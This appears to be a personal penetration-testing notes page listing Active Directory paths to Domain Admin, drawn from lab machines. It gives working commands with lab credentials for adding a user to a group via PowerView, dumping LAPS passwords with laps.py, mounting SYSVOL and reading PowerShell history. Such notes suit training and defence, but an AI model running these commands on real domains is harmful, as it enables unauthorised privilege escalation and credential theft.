---
description: >-
  Active Directory Privilege Escalation Techniques (Domain Admin)
title: Domain Admin Techniques              # Add title here
date: 2023-01-02 08:00:00 -0600                           # Change the date to match completion date
categories: [12 Active Directory, Privilege Escalation]                     # Change Templates to Writeup
tags: [active directory, windows privesc, readlaps, sysvol share, powershell history]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### Assign user to a group

This is a repository of techniques to get Domain Admin via multiple techniques.
```powershell
Import-Module ./PowerView.ps1

$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('streamio\\JDgodd', $SecPassword)

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -principalidentity "streamio\\JDgodd"

Add-DomainGroupMember -Identity 'Core Staff' -Members 'streamio\\JDgodd' -Credential $Cred

net group 'Core Staff'
```
Examples:
[[StreamIO#dc6ecc]]

### ReadLAPSPassword

We can use the utility laps.py to read LAPS passwords:
```bash
python3 laps.py -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb
LAPS Dumper - Running at 07-07-2022 13:57:05
DC &V@%DQ-wEwQ97A
```
[[StreamIO#^2cc182]]

### SYSVOL Share DC

We can enumerate SMB Shares within the machine: ^cae2ef
```bash
PS C:\Users\BTables\Desktop> Get-SMBShare

Name   ScopeName Path Description  
----   --------- ---- -----------  
ADMIN$ *              Remote Admin 
C$     *              Default share
IPC$   *              Remote IPC 
```
We can try to connect to the shares on the DC:
```bash
PS C:\Users\BTables\Desktop> net use \\dc.fulcrum.local\IPC$ /user:FULCRUM\BTables ++FileServerLogon12345++
The command completed successfully.
```
And then we can list the shares in the DC:
```bash
PS C:\Users\BTables\Desktop> net view \\dc.fulcrum.local\
Shared resources at \\dc.fulcrum.local\
Share name  Type  Used as  Comment              
-------------------------------------------------------------------------------
NETLOGON    Disk           Logon server share   
SYSVOL      Disk           Logon server share   
The command completed successfully.
```
We can then mount the share SYSVOL on the compromised machine to check its content:
```bash
PS C:\Users\BTables\Desktop> net use x: \\dc.fulcrum.local\SYSVOL /user:FULCRUM\BTables ++FileServerLogon12345++

The command completed successfully.
```
And we found a ton of scripts inside the Share:
```bash
PS X:\fulcrum.local\scripts> dir
    Directory: X:\fulcrum.local\scripts

Mode                LastWriteTime         Length Name
----                -------------         ----- -----                                                                                                                      
-a----        2/12/2022  10:34 PM            340 00034421-648d-4835-9b23-c0d315d71ba3.ps1
-a----        2/12/2022  10:34 PM            340 0003ed3b-31a9-4d8f-a152-a234ecb522d4.ps1
```

### Powershell History

We can retrieve commands executed on another machine by checking the ConsoleHost_history.txt which is the same as in Linux .bash_history file.
#Note If using this command we need to be on the User's folder since this file is located in the AppData folder:
```bash
PS C:\Users\legacyy> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
Examples:
[[Timelapse#^3ceb21]]